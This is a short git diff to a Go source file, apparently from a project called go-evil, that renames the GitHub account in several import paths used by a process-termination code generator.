@@ -3,8 +3,8 @@ package processes
 import (
 	"fmt"
 
-	"github.com/s9rA16Bf4/go-evil/utility/structure/functions"
-	"github.com/s9rA16Bf4/go-evil/utility/structure/json"
+	"github.com/DennisTheodoreNedry/go-evil/utility/structure/functions"
+	"github.com/DennisTheodoreNedry/go-evil/utility/structure/json"
 )
 
 // Tries to terminate a process based on it's pid
@@ -22,7 +22,7 @@ func Kill_id(value string, data_object *json.Json_t) []string {
 			"}",
 		}})
 
-	data_object.Add_go_import("github.com/s9rA16Bf4/Go-tools")
+	data_object.Add_go_import("github.com/DennisTheodoreNedry/Go-tools")
 	data_object.Add_go_import("github.com/redcode-labs/Coldfire")
 
 	parameter_1 := data_object.Generate_int_array_parameter(value)
